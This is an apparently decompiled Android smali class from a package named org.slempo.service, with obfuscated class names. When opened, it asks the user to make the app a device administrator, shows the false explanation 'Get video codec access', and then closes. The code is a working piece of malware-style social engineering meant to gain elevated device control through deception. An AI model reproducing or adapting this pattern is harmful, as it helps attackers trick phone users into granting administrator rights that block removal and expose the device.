.class public Lorg/slempo/service/euirnceurhdvbeurs;
.super Landroid/app/Activity;
.source "euirnceurhdvbeurs.java"


# instance fields
.field private deviceManager:Landroid/app/admin/DevicePolicyManager;


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 9
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method


# virtual methods
.method public checkDeviceAdmin()V
    .locals 4

    .prologue
    .line 21
    new-instance v0, Landroid/content/ComponentName;

    const-class v2, Lorg/slempo/service/ihnkkuigtvgyb7iujn;

    invoke-direct {v0, p0, v2}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 22
    .local v0, "componentName":Landroid/content/ComponentName;
    iget-object v2, p0, Lorg/slempo/service/euirnceurhdvbeurs;->deviceManager:Landroid/app/admin/DevicePolicyManager;

    invoke-virtual {v2, v0}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result v2

    if-nez v2, :cond_0

    .line 23
    new-instance v1, Landroid/content/Intent;

    .line 24
    const-string v2, "android.app.action.ADD_DEVICE_ADMIN"

    .line 23
    invoke-direct {v1, v2}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    .line 25
    .local v1, "intent":Landroid/content/Intent;
    const-string v2, "android.app.extra.DEVICE_ADMIN"

    invoke-virtual {v1, v2, v0}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;

    .line 26
    const-string v2, "android.app.extra.ADD_EXPLANATION"

    .line 27
    const-string v3, "Get video codec access"

    .line 26
    invoke-virtual {v1, v2, v3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 28
    invoke-virtual {p0, v1}, Lorg/slempo/service/euirnceurhdvbeurs;->startActivity(Landroid/content/Intent;)V

    .line 30
    .end local v1    # "intent":Landroid/content/Intent;
    :cond_0
    return-void
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 1
    .param p1, "savedInstanceState"    # Landroid/os/Bundle;

    .prologue
    .line 14
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 15
    const-string v0, "device_policy"

    invoke-virtual {p0, v0}, Lorg/slempo/service/euirnceurhdvbeurs;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/admin/DevicePolicyManager;

    iput-object v0, p0, Lorg/slempo/service/euirnceurhdvbeurs;->deviceManager:Landroid/app/admin/DevicePolicyManager;

    .line 16
    invoke-virtual {p0}, Lorg/slempo/service/euirnceurhdvbeurs;->checkDeviceAdmin()V

    .line 17
    invoke-virtual {p0}, Lorg/slempo/service/euirnceurhdvbeurs;->finish()V

    .line 18
    return-void
.end method
